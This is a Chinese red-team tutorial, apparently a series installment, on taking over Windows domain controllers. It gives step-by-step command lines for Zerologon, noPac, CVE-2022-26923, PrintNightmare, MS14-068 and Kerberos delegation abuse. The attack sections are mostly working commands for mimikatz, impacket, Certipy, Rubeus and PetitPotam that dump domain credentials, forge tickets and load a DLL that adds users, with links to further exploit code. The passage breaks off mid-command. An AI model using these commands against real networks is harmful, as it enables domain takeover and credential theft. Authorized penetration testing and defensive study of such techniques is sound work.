---
title: 连载：红队知识体系梳理-攻击域控制器
url: https://mp.weixin.qq.com/s?__biz=MzI0NzEwOTM0MA==&mid=2652500657&idx=1&sn=f1baf73dfc17de92be013d943e4d63a6&chksm=f2585102c52fd814120c1f748cd79f9ea71dc4a62860c25dc93a1377e70ce0841ee8c794c325&scene=58&subscene=0#rd
source: 雷神众测
date: 2022-11-24
fetch_date: 2025-10-03T23:39:17.522803
---

# 连载：红队知识体系梳理-攻击域控制器

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/HxO8NorP4JWYacSnQsVibwVQD8Nla1HDHJVfh2tvh3Id2Dfzf49HxanQa9XWOCkDONTT3K1EmansdCAJdiaTiclzQ/0?wx_fmt=jpeg)

# 连载：红队知识体系梳理-攻击域控制器

原创

果冻

雷神众测

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NRJcUCTyzTib05Vc8ysann6YRykZuuFN7iakK0iaicz2h2pMEeQNwZlrzIpHO5Atb6k1X6WNVGjTV66ib/640?wx_fmt=svg)

**STATEMENT**

**声明**

由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，雷神众测及文章作者不为此承担任何责任。

雷神众测拥有对此文章的修改和解释权。如欲转载或传播此文章，必须保证此文章的完整性，包括版权声明等全部内容。未经雷神众测允许，不得任意修改或者增减此文章内容，不得以任何方式将其用于商业目的。

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NRJcUCTyzTib05Vc8ysann6YRykZuuFN7iakK0iaicz2h2pMEeQNwZlrzIpHO5Atb6k1X6WNVGjTV66ib/640?wx_fmt=svg)

通用漏洞

使用windows通用漏洞攻击机器获取权限

**zerologon**

利用CVE-2020-1472 Netlogon协议漏洞置空域机器用户密码，随后进行dcsync。影响2008-2004。注意：置空域机器用户密码会导致域控机器脱域，导致域内依赖ldap提供的服务通信异常，DNS服务异常，需要及时还原

```
#检测是否存在漏洞mimikatz.exe "lsadump::zerologon /target:192.168.10.250 /account:test$" exitpython zerologon_exploit.py 192.168.10.250  -scan
```

```
#利用漏洞重置机器用户密码mimikatz.exe "lsadump::zerologon /target:192.168.10.250 /account:test$  /exploit" exit
python zerologon_exploit.py  192.168.10.250  -exp
```

```
#使用机器用户dcsync
python secretsdump.py -no-pass -just-dc qaq/TEST$@192.168.10.250python3 secretsdump.py -no-pass -just-dc qaq/TEST\$@192.168.10.250  #根据系统特性可能需要转义$
```

```
#从SAM文件中恢复机器用户密码mimikatz.exe "lsadump::postzerologon /target:qaq.com /account:TEST$ " exit  #不能代理执行
python zerologon_exploit.py  192.168.10.250  -recover
```

**nopac**

利用CVE-2021-42278 sAMAccountName名绕过漏洞和CVE-2021-42287 kerberos TGS认证漏洞组合利用，创建机器用户S4U2self生成域管权限ST。影响：windows 2008-2022。需要域账户

* sam-the-admin

```
python3 sam_the_admin.py  qaq/test:Aa123456 -dc-ip 192.168.11.250  -debugpython3  sam_the_admin.py qaq/test:Aa123456 -dc-ip 192.168.11.250 -dump -debug  #dcsyncpython3  sam_the_admin.py qaq/test:Aa123456 -dc-ip 192.168.11.250  -shell -debug
```

‍* nopac

```
#检测漏洞noPac.exe scan -domain qaq.org -user admin -pass 'Aa123456'
#利用漏请求域管用户 cifs服务ST,用于访问共享noPac.exe -domain qaq.org -user admin -pass 'Aa123456' /dc test5-2012.qaq.org /mAccount saulgoodman /mPassword passW0rd /service cifs /ptt#利用漏请求域管用户 ldap服务ST,用于dcsyncnoPac.exe -domain qaq.org -user admin -pass 'Aa123456' /dc test5-2012.qaq.org /mAccount saulgoodman /mPassword passW0rd /service ldap /ptt#利用漏请求域管用户HOST/RPCSS服务ST，用于执行命令。远程利用可noPac.exe -domain qaq.org -user admin -pass 'Aa123456' /dc test5-2012.qaq.org /mAccount saulgoodman /mPassword passW0rd /service HOST /pttnoPac.exe -domain qaq.org -user admin -pass 'Aa123456' /dc test5-2012.qaq.org /mAccount saulgoodman /mPassword passW0rd /service RPCSS /ptt

#远程利用导出注入LDAP dcsync，先用MIMIkatz导出票据python ticket_converter.py ticket.kirbi ticket.ccache    #kirbi转换为impacket ccache票据格式export KRB5CCNAME=ticket.ccachepython secretsdump.py -k -no-pass test5-2012.qaq.org  -just-dc
```

**CVE-2022-26923**

利用CVE-2022-26923 ADcs提权漏洞，创建机器用户并修改dNSHostName属性(DNS属性)为域控机器名，申请域控机器账户的证书然后进行dcsync。需要域内凭证。影响windows 2008-2022。

* Certipy

  定位adcs

```
certutil -dump -vcertipy find "qaq.org/test:Aa123456@192.168.11.250" -debug #域外
```

```
#创建机器用户 dns属性设为域控机器名 certipy account create "qaq.org/admin:Aa123456@192.168.11.250" -dc-ip 192.168.11.250 -user "aaaa" -dns "test5-2012.qaq.org" -debug#申请创建的机器账户证书,-ca为CA Name，target为CA hostcertipy req -dc-ip 192.168.11.250 "qaq.org/aaaa$:udA3HVjoph9vHbNz@test5-2012.qaq.org" -ca qaq-TEST5-2012-CA -template Machine -debug#使用证书发起kerberos认证获取域控机器账户hashcertipy auth -pfx  test5-2012.pfx  -dc-ip 192.168.11.250 -debu
```

```
python secretsdump.py -hashes 2780694409376cd447f5894f5b407089:2780694409376cd447f5894f5b407089  qaq/test5-2012$@192.168.11.250 -just-dc
```

**PrintNightmare**

利用CVE-2021-1675 打印机服务漏洞加载DLL执行代码。影响2008-2019。需要域内凭证，实测2016和2019可利用成功

使用impacket rpcdump.py脚本检测print spooler服务

```
python rpcdump.py 192.168.10.250 | findstr MS-RPRNpython rpcdump.py 192.168.10.250 | findstr MS-PAR
```

将dll放在共享目录，设置成可匿名访问，利用打印机服务需要一个域内凭证，域控需要获取DLL

linux 安装samba服务设置smb共享

```
#windows 设置文件共享服务器
#设置匿名SMB共享powershell -exec bypass -command "&{ import-module .\Invoke-BuildAnonymousSMBServer.ps1;Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Enable}"#关闭powershell -exec bypass -command "&{ import-module .\Invoke-BuildAnonymousSMBServer.ps1;Invoke-BuildAnonymousSMBServer -Path c:\share -Mode Disable}
```

```
python CVE-2021-1675.py qaq.com/admin:Aa123456@192.168.10.250   '\\192.168.10.104\smb\adduserx64.dll'
SharpPrintNightmare.exe   '\\192.168.10.104\smb\adduserx64.dll'  '\\192.168.10.250'SharpPrintNightmare.exe  '\\192.168.10.104\smb\adduserx64.dll'   '\\192.168.10.250' qaq.com  admin Aa123456SharpPrintNightmare.exe c:\adduserx64.dl #本地提权
```

**ms14-068**

利用CVE-2014-6324漏洞，申请用户TGT修改PAC为域管权限，获取域控权限。需要一个域内凭证

```
#会生成ccache票据ms14-068.exe -u 域成员名@域名 -s 域成员sid -d 域控制器地址 -p 域成员密码
```

```
export KRB5CCNAME=ticket.ccachepython secretsdump.py -k -no-pass test5-2012.qaq.org  -just-dc
```

**ms17-010**

使用ms17-010漏洞攻击域控制器获取权限。存在杀软导致ms17-010利用失败时，可使用匿名管道或一个普通用户凭证发payload绕过杀软

攻击PC终端可能会导致蓝屏重启

**BlueKeep**

利用cve-2019-0708 RDP远程代码执行漏洞获取权限，可能会蓝屏

利用：
https://github.com/cbwang505/CVE-2019-0708-EXP-Windows
https://github.com/RICSecLab/CVE-2019-0708
metasploit cve-2019-0708 exp模块

**SMBGhost**

利用CVE-2020-0796 SMB v3远程代码执行漏洞获取权限，可能会蓝屏。只影响Windows 10 1903-1909

利用：
https://github.com/ZecOps/CVE-2020-0796-RCE-POC
metasploit CVE-2020-0796 exp模块

![](https://mmbiz.qpic.cn/mmbiz_svg/ofvnGicEPbfSzSpQGue94NRJcUCTyzTib05Vc8ysann6YRykZuuFN7iakK0iaicz2h2pMEeQNwZlrzIpHO5Atb6k1X6WNVGjTV66ib/640?wx_fmt=svg)

委派攻击

**非约束委派**

拿到非约束委派服务机器权限后，dump lsass进程票据，寻找域管票据。或者诱导域控访问非约束委派服务，然后抓域管TGT

监听认证请求，也可以直接dump lsass票据

```
#监听来自域控机器账户的TGT认证请求Rubeus.exe monitor /interval:1 /filteruser:test$
Rubeus.exe ptt /ticket:base64 #注入
```

* 利用spooler打印机bug漏洞强制域控请求

2012 R2以上可利用成功，2012 r2以下版本不在rpc中暴露Spooler服务

```
SpoolSample.exe 目标主机名 回连主机名python dementor.py -d domain -u username -p password 回连ip 目标ippython3 printerbug.py qaq.com/admin:"Aa123456"@192.168.10.250  回连主机
```

* 利用PetitPotam MS-EFSRPC远程文件加密协议漏洞强制域请求

2008-2012可匿名触发，其他版本需要域内凭证

```
python3  PetitPotam.py   -d qaq.org -u admin -p Aa123456   WIN-7GPBH5JIVUL.qaq.org 192.168.11.250
PetitPotam.exe  WIN-7GPBH5JIVUL.qaq.org  192.168.11.250 1
```

**约束委派**

拿到约束委派服务账户凭证后，利用S4U2协议申请委派的机器服务票据。只能申请委派指定机器、委派指定服务的票据

* impacket 利用

```
#使用约束委派服务账户  申请域管用户的LDAP服务票据python getST.py -dc-ip 192.168.11.250 -spn ldap/test5-2012.qaq.org  -impersonate administrator  qaq.org/WIN-7GPBH5JIVUL$ -hashes ca76767743d85196fa610bd2f1c9d48e:ca76767743d85196fa610bd2f1c9d48e
export KRB5CCNAME=ticket.ccachepython secretsdump.py -k -no-pass test5-2012.qaq.org   -just-dc  -outputfile qaq
```

* 使用kekeo利用

1.先申请约束委派服务账户TGT

```
kekeo.exe "tgt::ask /user:WIN-7GPBH5JIVUL$ /domain:qaq.org /password:Aa123456" exitkekeo.exe "tgt::ask /user:WIN-7GPBH5JIVUL$ /domain:qaq.org /NTLM:ca76767743d85196fa610bd2f1c9d48e" exit
```

2.S4U2self协议申请域管账户访问本机的ST1，S4U2proxy协议申请域管访问域控的LDAP ST2票据

```
#会生成二个票据，ST1和st2kekeo.exe "tgs::s4u /tgt:1.kirbi /user:Administrator@qaq.org /service:ldap/test5-2012.qaq.org" exit mimikatz.exe "kerberos::ptt ldap.kribi" exitmimikatz.exe "lsadump::dcsync /domain:qaq.org /dc:test5-2012.qaq.org /csv /all" exit
```

**资源约束委派**

配置机器主机属性msDS-AllowedToActOnBehalfOfOtherIdentity值，配置机器资源委派属性。然后利用S4U2协议申请票据获取权限

1.配置资源委派属性

新建机器用户

```
#创建机器用户powershell -exec bypass  "&{import-module .\Powermad.ps1; New-MachineAccount -MachineAccount xxx -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose }"#查询新建机器的SIDpowershell -exec bypass "&{import-module .\powerview.ps1;  Get-DomainComputer xxx -Properties objectsid | Select -Expand objectsid}"
```

2.修改msds-allowedtoactonbehalfofotheridentity属性为新建的机器用户SID

```
powershell -exec bypassimport-module .\powerview.ps1;
#修改msds-allowedtoactonbehalfofotheridentity属$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-476141730-3945430675-3953811658-1198)"$SDBytes = New-Object byte[] ($SD.BinaryLength)$SD.GetBinaryForm($SDBytes, 0)Get-D...